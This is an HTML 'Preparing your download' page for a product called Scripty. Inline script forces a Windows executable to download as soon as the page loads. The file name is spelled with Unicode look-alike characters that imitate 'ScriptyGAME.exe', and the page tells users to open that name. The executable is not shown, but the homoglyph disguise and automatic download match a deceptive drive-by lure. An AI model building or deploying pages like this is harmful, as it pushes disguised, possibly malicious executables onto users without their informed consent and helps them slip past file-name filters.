<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Downloading... | Scripty</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="/download/download.css">
</head>
<body>
  <div class="container">
    <h1>Preparing your download...</h1>
    <div class="loader"></div>
    <p>If the download doesn't start automatically, <a href="/assets/files/ЅϲʀіρτуᏀᎪⅯЕ.exe" class="download-link">click here</a>.</p>
    <p id="openMessage" style="display:none; color: #fff; font-size: 16px; margin-top: 20px;">Once downloaded, you can open <strong>ScriptyGAME.exe</strong>.</p>
  </div>

  <script src="/download/download.js"></script>

  <script>
    window.onload = function () {
      const downloadUrl = "/assets/files/ЅϲʀіρτуᏀᎪⅯЕ.exe";
      const link = document.createElement('a');
      link.href = downloadUrl;
      link.download = "ЅϲʀіρτуᏀᎪⅯЕ.exe";
      
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);

      const openMessage = document.getElementById('openMessage');
      openMessage.style.display = 'block';
    };
  </script>
</body>
</html>
